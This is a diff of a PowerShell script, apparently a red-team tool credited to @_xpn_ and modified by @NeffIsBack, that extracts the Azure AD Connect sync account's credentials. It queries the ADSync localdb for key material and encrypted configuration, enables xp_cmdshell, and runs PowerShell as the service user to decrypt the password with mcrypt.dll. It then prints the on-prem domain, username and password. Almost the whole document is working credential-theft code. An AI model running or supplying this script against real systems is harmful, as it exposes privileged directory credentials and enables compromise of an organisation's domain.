@@ -1,6 +1,5 @@
-Write-Host "AD Connect Sync Credential Extract v2 (@_xpn_)"
-Write-Host "`t[ Updated to support new cryptokey storage method ]`n"
-
+# Original script by @_xpn_: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
+# Modified by @NeffIsBack
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"
 
 try {
@@ -9,8 +8,6 @@ try {
     Write-Host "[!] Could not connect to localdb..."
     return
 }
-
-Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"
 
 $cmd = $client.CreateCommand()
 $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
@@ -25,8 +22,6 @@ $instance_id = $reader.GetGuid(1)
 $entropy = $reader.GetGuid(2)
 $reader.Close()
 
-Write-Host "[*] Querying ADSync localdb (mms_management_agent)"
-
 $cmd = $client.CreateCommand()
 $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
 $reader = $cmd.ExecuteReader()
@@ -39,10 +34,12 @@ $config = $reader.GetString(0)
 $crypted = $reader.GetString(1)
 $reader.Close()
 
-Write-Host "[*] Using xp_cmdshell to run some Powershell as the service user"
+$script = "add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host `$decrypted"
 
 $cmd = $client.CreateCommand()
-$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host `$decrypted`"'"
+$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; 
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
+EXEC xp_cmdshell 'powershell.exe -c `"$script`"'"
 $reader = $cmd.ExecuteReader()
 
 $decrypted = [string]::Empty
@@ -60,8 +57,7 @@ $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-do
 $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
 $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
 
-Write-Host "[*] Credentials incoming...`n"
-
-Write-Host "Domain: $($domain.Domain)"
-Write-Host "Username: $($username.Username)"
-Write-Host "Password: $($password.Password)"
+Write-Host "[*] Credentials incoming..."
+Write-Host "On-prem Domain: $($domain.Domain)"
+Write-Host "On-prem Username: $($username.Username)"
+Write-Host "On-prem Password: $($password.Password)"
